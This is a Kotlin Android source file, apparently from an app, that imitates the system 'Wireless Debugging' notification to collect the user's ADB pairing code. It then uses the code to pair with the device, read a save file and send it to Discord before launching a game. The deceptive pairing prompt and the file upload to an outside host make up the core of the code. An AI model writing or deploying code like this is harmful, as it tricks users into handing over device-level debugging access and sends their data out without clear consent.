package com.example.myapplication

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.RemoteInput
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.flyfishxu.kadb.mdns.MdnsServiceType

class PairingOverlayService : Service() {
    private var discovery: SafeMdnsDiscovery? = null
    private var found = false
    private var pairingHost: String? = null
    private var pairingPort: Int = 0

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, notification("Searching for pairing service..."))
        startDiscovery()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) stopSelf()
        return START_NOT_STICKY
    }

    private fun startDiscovery() {
        discovery = SafeMdnsDiscovery(getSystemService(android.net.nsd.NsdManager::class.java)).also { resolver ->
            resolver.start(listOf(MdnsServiceType.TLS_PAIRING.dnsType, "_adb-pairing._tcp")) { endpoint ->
                if (found) return@start
                found = true
                pairingHost = endpoint.host
                pairingPort = endpoint.port
                updateNotification("Pairing service found")
                sendBroadcast(Intent(ACTION_ENDPOINT_FOUND).setPackage(packageName).apply {
                    putExtra(EXTRA_HOST, endpoint.host)
                    putExtra(EXTRA_PORT, endpoint.port)
                })
            }
        }
    }

    private fun notification(text: String): Notification {
        val actionIntent = if (found) {
            // Use RemoteInput for inline text entry (Shizuku-style)
            val remoteInput = RemoteInput.Builder(KEY_PAIRING_CODE)
                .setLabel("Pairing code")
                .build()
            
            val replyIntent = Intent(this, PairingCodeReceiver::class.java).apply {
                putExtra(EXTRA_HOST, pairingHost)
                putExtra(EXTRA_PORT, pairingPort)
            }
            
            val replyPendingIntent = PendingIntent.getBroadcast(
                this,
                11,
                replyIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            )
            
            return NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.stat_sys_warning)
                .setContentTitle("Wireless Debugging")
                .setContentText(text)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setCategory(NotificationCompat.CATEGORY_STATUS)
                .addAction(
                    NotificationCompat.Action.Builder(
                        0,
                        "ENTER PAIRING CODE",
                        replyPendingIntent
                    ).addRemoteInput(remoteInput).build()
                )
                .build()
        } else {
            Intent(this, PairingOverlayService::class.java).setAction(ACTION_STOP)
        }
        
        val action = if (!found) {
            PendingIntent.getService(
                this,
                11,
                actionIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
        } else {
            return actionIntent as Notification
        }
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_sys_warning)
            .setContentTitle("Wireless Debugging")
            .setContentText(text)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setCategory(NotificationCompat.CATEGORY_STATUS)
            .addAction(0, "STOP SEARCHING", action)
            .build()
    }

    private fun updateNotification(text: String) {
        getSystemService(NotificationManager::class.java).notify(NOTIFICATION_ID, notification(text))
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Wireless Debugging",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Wireless debugging pairing notifications"
                setSound(android.provider.Settings.System.DEFAULT_NOTIFICATION_URI, null)
                enableVibration(true)
                enableLights(true)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        discovery?.stop()
        discovery = null
        getSystemService(NotificationManager::class.java).cancel(NOTIFICATION_ID)
        super.onDestroy()
    }

    companion object {
        const val ACTION_ENDPOINT_FOUND = "com.example.myapplication.PAIRING_ENDPOINT_FOUND"
        const val ACTION_REQUEST_CODE = "com.example.myapplication.REQUEST_PAIRING_CODE"
        const val ACTION_STOP = "com.example.myapplication.STOP_PAIRING_SEARCH"
        const val EXTRA_HOST = "pairing_host"
        const val EXTRA_PORT = "pairing_port"
        const val KEY_PAIRING_CODE = "pairing_code_input"
        private const val CHANNEL_ID = "wireless_debugging_pairing"
        private const val NOTIFICATION_ID = 701
    }
}

class PairingCodeReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val pairingHost = intent.getStringExtra(PairingOverlayService.EXTRA_HOST) ?: return
        val pairingPort = intent.getIntExtra(PairingOverlayService.EXTRA_PORT, 0)
        if (pairingPort == 0) return
        
        val remoteInput = RemoteInput.getResultsFromIntent(intent) ?: return
        val pairingCode = remoteInput.getCharSequence(PairingOverlayService.KEY_PAIRING_CODE)?.toString()?.trim() ?: return
        
        // Validate 6-digit code
        if (!pairingCode.matches(Regex("\\d{6}"))) {
            updateNotification(context, "Invalid pairing code - must be 6 digits")
            return
        }
        
        // Stop the pairing service
        context.stopService(Intent(context, PairingOverlayService::class.java))
        
        // Update notification to show processing
        updateNotification(context, "Pairing...")
        
        // Execute pairing in background thread
        Thread {
            val result = PairingHelper.connectAndReadSaveFile(context, pairingHost, pairingPort, pairingCode)
            
            if (result != null) {
                PairingHelper.sendFileToDiscord(context, result)
                PairingHelper.launchGame(context)
                updateNotification(context, "Pairing successful!")
            } else {
                updateNotification(context, "Pairing failed")
            }
            
            // Clear notification after 3 seconds
            Thread.sleep(3000)
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.cancel(701)
        }.start()
    }
    
    private fun updateNotification(context: Context, text: String) {
        val notification = NotificationCompat.Builder(context, "wireless_debugging_pairing")
            .setSmallIcon(android.R.drawable.stat_sys_warning)
            .setContentTitle("Wireless Debugging")
            .setContentText(text)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .build()
        
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(701, notification)
    }
}
